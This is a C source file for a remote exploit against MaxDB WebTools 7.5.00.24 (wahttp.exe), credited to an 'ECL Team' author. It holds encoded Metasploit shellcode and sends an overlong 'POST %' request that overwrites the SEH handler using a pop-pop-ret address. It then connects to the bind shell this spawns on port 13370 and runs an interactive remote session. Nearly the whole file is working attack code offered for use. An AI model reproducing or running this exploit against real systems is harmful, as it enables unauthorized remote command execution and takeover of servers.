/* ecl-maxdb.c
 * Yuri Gushin <yuri@eclipse.org.il>
 *
 * MaxDB Webtools % overflow, this one uses POST, tested on version
 * 7.5.00.24, XP/2K, doesn't matter since the address used is taken
 * from wahttp.exe :)
 *
 * Greets fly out to the ECL crew, Alex Behar, Valentin Slavov,
 * blexim, stranger, Dimiter Manevski, elius, shrink, cntz, tanin00
 * and anyone else who got left out :D
 *
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <err.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <arpa/inet.h>

char sc[] = // gotta love metasploit
"\x29\xc9\x83\xe9\xaf\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x32"
"\x39\x88\x85\x83\xeb\xfc\xe2\xf4\xce\x53\x63\xca\xda\xc0\x77\x7a"
"\xcd\x59\x03\xe9\x16\x1d\x03\xc0\x0e\xb2\xf4\x80\x4a\x38\x67\x0e"
"\x7d\x21\x03\xda\x12\x38\x63\x66\x02\x70\x03\xb1\xb9\x38\x66\xb4"
"\xf2\xa0\x24\x01\xf2\x4d\x8f\x44\xf8\x34\x89\x47\xd9\xcd\xb3\xd1"
"\x16\x11\xfd\x66\xb9\x66\xac\x84\xd9\x5f\x03\x89\x79\xb2\xd7\x99"
"\x33\xd2\x8b\xa9\xb9\xb0\xe4\xa1\x2e\x58\x4b\xb4\xf2\x5d\x03\xc5"
"\x02\xb2\xc8\x89\xb9\x49\x94\x28\xb9\x79\x80\xdb\x5a\xb7\xc6\x8b"
"\xde\x69\x77\x53\x03\xe2\xee\xd6\x54\x51\xbb\xb7\x5a\x4e\xfb\xb7"
"\x6d\x6d\x77\x55\x5a\xf2\x65\x79\x09\x69\x77\x53\x6d\xb0\x6d\xe3"
"\xb3\xd4\x80\x87\x67\x53\x8a\x7a\xe2\x51\x51\x8c\xc7\x94\xdf\x7a"
"\xe4\x6a\xdb\xd6\x61\x6a\xcb\xd6\x71\x6a\x77\x55\x54\x51\xbc\xbf"
"\x54\x6a\x01\x64\xa7\x51\x2c\x9f\x42\xfe\xdf\x7a\xe4\x53\x98\xd4"
"\x67\xc6\x58\xed\x96\x94\xa6\x6c\x65\xc6\x5e\xd6\x67\xc6\x58\xed"
"\xd7\x70\x0e\xcc\x65\xc6\x5e\xd5\x66\x6d\xdd\x7a\xe2\xaa\xe0\x62"
"\x4b\xff\xf1\xd2\xcd\xef\xdd\x7a\xe2\x5f\xe2\xe1\x54\x51\xeb\xe8"
"\xbb\xdc\xe2\xd5\x6b\x10\x44\x0c\xd5\x53\xcc\x0c\xd0\x08\x48\x76"
"\x98\xc7\xca\xa8\xcc\x7b\xa4\x16\xbf\x43\xb0\x2e\x99\x92\xe0\xf7"
"\xcc\x8a\x9e\x7a\x47\x7d\x77\x53\x69\x6e\xda\xd4\x63\x68\xe2\x84"
"\x63\x68\xdd\xd4\xcd\xe9\xe0\x28\xeb\x3c\x46\xd6\xcd\xef\xe2\x7a"
"\xcd\x0e\x77\x55\xb9\x6e\x74\x06\xf6\x5d\x77\x53\x60\xc6\x58\xed"
"\xc2\xb3\x8c\xda\x61\xc6\x5e\x7a\xe2\x39\x88\x85";


int connect_port(u_short port);
void exploit(int sock);
void shell(int sock);
void usage(char *cmd);
void banner(void);


struct sockaddr_in host;

int main(int argc, char **argv)
{
  int sock_maxdb, sock_shell;
  struct hostent *hn;

  banner();
  if (argc < 2) usage(argv[0]);

  memset(&host, 0, sizeof(host));
  host.sin_family = AF_INET;
  host.sin_port = (argc > 2) ? htons((u_short)atoi(argv[2])) : htons(9999);

  if ( (hn = gethostbyname(argv[1])) == NULL)
    errx(-1, "Unresolvable address\n");

  memcpy(&host.sin_addr, hn->h_addr, hn->h_length);
  printf("[*] Connecting to %s:%d... ",
	 inet_ntoa(host.sin_addr), ntohs(host.sin_port));
  fflush(stdout);

  sock_maxdb = connect_port(ntohs(host.sin_port));

  if (!sock_maxdb) 
    {
      printf("failure.\n\n");
      exit(-1);
    }
  printf("success.\n");

  printf("[*] Sending evil payload...\n");
  exploit(sock_maxdb);
  close(sock_maxdb);
  fflush(stdout);

  sleep(1);

  printf("[*] Trying to connect to spawned shell... ");
  sock_shell = connect_port(13370);

  if (!sock_shell)
    {
      printf("failure.\n\n");
      exit(-1);
    }

  printf("success!\n\nEnjoy :)\n\n");
  shell(sock_shell);

  return 0;
}

int connect_port(u_short port)
{
  int sock;
  struct sockaddr_in hostport;

  memcpy(&hostport, &host, sizeof(host));
  hostport.sin_port = ntohs(port);

  if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
      return 0;
  if(connect(sock, (struct sockaddr *)&hostport, sizeof(hostport)) < 0)
    {
      close(sock);
      return 0;
    }

  return sock;
}

void exploit(int sock)
{
  int i;
  char payload[3640];
  char exploit[] = 
    "\xe9\x21\xf8\xff\xff"	//  jump back to our shellcode
    "\xeb\xf9\xff\xff"		//  jump back to our jump ^^  [SEH next function pointer]
    "\x8c\x45\x41\x00";		//  pop+pop+ret	(wahttp.exe)  [SEH function pointer]

  write(sock, "POST %", 6);
  for (i = 0; i<sizeof(payload); i+=3)
    strncpy(&payload[i], "ECL", 3);

  memcpy(&payload[sizeof(payload)-30]-strlen(sc), sc, strlen(sc));

  write(sock, payload, sizeof(payload));
  write(sock, exploit, sizeof(exploit));
  write(sock, " HTTP/1.0\r\n\r\n", 13);
}

void shell(int sock)
{
  int n;
  fd_set fd;
  char buff[1024];

  while(1)
    {
     
      FD_SET(sock, &fd);
      FD_SET(0, &fd);

      select(sock+1, &fd, NULL, NULL, NULL);

      if( FD_ISSET(sock, &fd) )
        {
          n = read(sock, buff, sizeof(buff));
          if (n < 0) err(1, "remote read");
          write(1, buff, n);
        }

      if ( FD_ISSET(0, &fd) )
        {
          n = read(0, buff, sizeof(buff));
          if (n < 0) err(1, "local read");
          write(sock, buff, n);
        }
    }    
}

void usage(char *cmd)
{
  printf("Usage: %s host <port>\n\n", cmd);
  exit(1);
}

void banner(void)
{
  printf("\t\tMaxDB WebTools HTTP %% parsing exploit\n"
         "\t\t  Yuri Gushin <yuri@eclipse.org.il>\n"
         "\t\t\t       ECL Team\n\n\n");
}
